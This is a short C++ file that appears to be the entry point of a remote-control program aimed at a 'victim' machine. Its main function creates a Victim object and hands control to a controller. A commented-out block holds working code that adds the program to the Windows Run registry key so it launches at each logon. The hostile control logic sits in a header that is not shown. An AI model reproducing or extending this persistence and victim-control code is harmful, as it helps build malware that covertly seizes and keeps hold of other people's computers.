#include "victim.h"
#include <thread>

int main()
{
    /*std::wstring progPath = L"C:\\Users\\feder\\Desktop\\Controller\\x64\\Release\\Victim.exe";
    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);   
    LONG status = RegSetValueEx(hkey, L"Victim", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));*/


    Victim victim;

    return victim.controlVictim();
}